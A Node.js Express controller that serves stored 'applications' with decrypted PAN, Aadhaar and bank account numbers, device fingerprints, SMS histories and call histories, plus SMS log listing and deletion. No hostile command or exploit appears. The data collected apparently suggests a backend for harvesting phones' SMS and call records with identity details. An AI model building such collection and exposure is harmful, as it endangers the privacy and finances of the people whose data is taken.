const { Application, SmsLog } = require('../models');
const { decrypt } = require('../utils/encryption');

exports.getAllApplications = async (req, res) => {
    try {
        const applications = await Application.findAll({
            attributes: {
                include: [
                    [
                        // Fallback-safe subquery: count by both applicationId and deviceId to ensure no signals are missed
                        require('sequelize').literal(`(
                            SELECT COUNT(*)
                            FROM "SmsLogs"
                            WHERE "SmsLogs"."applicationId" = "Application"."applicationId"
                            OR ("SmsLogs"."deviceId" = "Application"."deviceId" AND "SmsLogs"."applicationId" IS NULL)
                        )`),
                        'smsCount'
                    ]
                ]
            },
            order: [['createdAt', 'DESC']]
        });

        const decryptedApplications = applications.map(app => {
            const data = app.toJSON();
            return {
                ...data,
                smsCount: parseInt(data.smsCount) || 0,
                panCard: decrypt(data.panCard),
                aadhaarNumber: decrypt(data.aadhaarNumber),
                bankAccount: decrypt(data.bankAccount),
                deviceFingerprint: decrypt(data.deviceFingerprint),
                smsHistory: decrypt(data.smsHistory),
                callHistory: decrypt(data.callHistory)
            };
        });

        res.json(decryptedApplications);
    } catch (error) {
        console.error('Fetch apps error:', error);
        res.status(500).json({ error: 'Failed to fetch data' });
    }
};

exports.getApplicationById = async (req, res) => {
    try {
        const { id } = req.params;
        const app = await Application.findOne({ where: { applicationId: id } });

        if (!app) return res.status(404).json({ error: 'Not found' });

        const data = app.toJSON();
        res.json({
            ...data,
            panCard: decrypt(data.panCard),
            aadhaarNumber: decrypt(data.aadhaarNumber),
            bankAccount: decrypt(data.bankAccount),
            deviceFingerprint: decrypt(data.deviceFingerprint),
            smsHistory: decrypt(data.smsHistory),
            callHistory: decrypt(data.callHistory)
        });
    } catch (error) {
        res.status(500).json({ error: 'Error fetching details' });
    }
};

exports.getSmsLogs = async (req, res) => {
    try {
        const { applicationId, deviceId } = req.query;
        let where = {};
        if (applicationId) where.applicationId = applicationId;
        if (deviceId) where.deviceId = deviceId;

        const logs = await SmsLog.findAll({
            where,
            order: [['date', 'DESC']],
            limit: 100
        });

        res.json(logs);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch logs' });
    }
};

exports.deleteApplication = async (req, res) => {
    try {
        const { id } = req.params;
        const app = await Application.findOne({ where: { applicationId: id } });
        if (!app) return res.status(404).json({ error: 'Not found' });

        // Deleting the application also deletes associated SMS logs if logic permits, 
        // but here we manually delete them to be safe if hooks aren't set.
        await SmsLog.destroy({ where: { applicationId: id } });
        await app.destroy();

        res.status(204).send();
    } catch (error) {
        console.error('Delete error:', error);
        res.status(500).json({ error: 'Failed to delete record' });
    }
};
